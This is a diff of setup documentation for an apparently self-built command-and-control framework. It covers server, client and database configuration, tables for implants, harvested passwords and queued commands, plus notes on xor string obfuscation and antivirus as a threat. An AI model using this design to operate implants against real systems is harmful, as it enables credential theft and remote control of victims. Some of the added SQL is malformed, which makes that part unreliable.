@@ -4,8 +4,29 @@
 
 ### C2 
 Inside /C2 run
-```pip install -r requirements.txt```
-Then run flask run. You need to set up an .env file with the nescesary variables for the database. 
+```pip install -r requirements.txt```.
+
+
+Then run ```flask run```. 
+
+You need to set up an .env file with the nescesary variables for the PostgreSQL database, to be put inside the C2 directory. 
+
+.env: 
+```env
+username = [database username]
+password = [database password]
+host = [database host value]
+thePort = [database port value]
+database = [database to use] 
+sslmode = require
+client = [domain of client (for CORS)]
+```
+
+### Client 
+
+Run ```npm install``` inside client/. ```npm start``` to run the client.  
+
+Needs a .env folder in client/ with this value: ```REACT_APP_C2URL = [IP for C2]```
 
 ### Database 
 
@@ -32,7 +53,7 @@ CREATE TABLE public.files (
 
 CREATE TABLE public.implants (
     implant_id serial PRIMARY KEY,
-    first_connection timestamp without time zone NOT NULL,
+    first_connection timestamp without time zone,
     active boolean,
     location character varying(950),
     computer_name character varying(50),
@@ -45,12 +66,16 @@ CREATE TABLE public.implants (
     session_key character varying(255)
 );
 
+INSERT INTO public.implants(
+	implant_id)
+	VALUES (1);
+);
 
 
 CREATE TABLE public.passwords (
-    p_key integer PRIMARY KEY NOT NULL,
-    task_id integer NOT NULL,
-    target_implant_id integer NOT NULL,
+    p_key integer PRIMARY KEY,
+    task_id integer,
+    target_implant_id integer,
     path text,
     username text,
     password text,
@@ -59,8 +84,8 @@ CREATE TABLE public.passwords (
 
 
 CREATE TABLE public.task_queue (
-    task_id serial PRIMARY KEY NOT NULL,
-    target_implant_id integer NOT NULL,
+    task_id serial PRIMARY ,
+    target_implant_id integer,
     command character varying(100),
     created_on timestamp without time zone,
     status character varying(20),
@@ -72,7 +97,7 @@ CREATE TABLE public.task_queue (
 
 
 CREATE TABLE public.users (
-    user_id serial NOT NULL PRIMARY KEY,
+    user_id serial PRIMARY KEY,
     name character varying(25),
     is_online boolean,
     password character varying,
@@ -82,7 +107,7 @@ CREATE TABLE public.users (
 ```
 
 ### The implant 
-See make files 
+Implant 2 is the new and functional implant. Use provided makefile to compile.
 
 
 ## Using the C2 - Our production server 
@@ -135,11 +160,6 @@ When the executable first runs, we try to create a global event with a specific 
 ### String Obfuscation
 
 All strings are encrypted with a simple xor and then decrypted before each use. 
-
-
-
-
-## Opsec 
 
 ## Threats
 Microsoft’s antivirus software
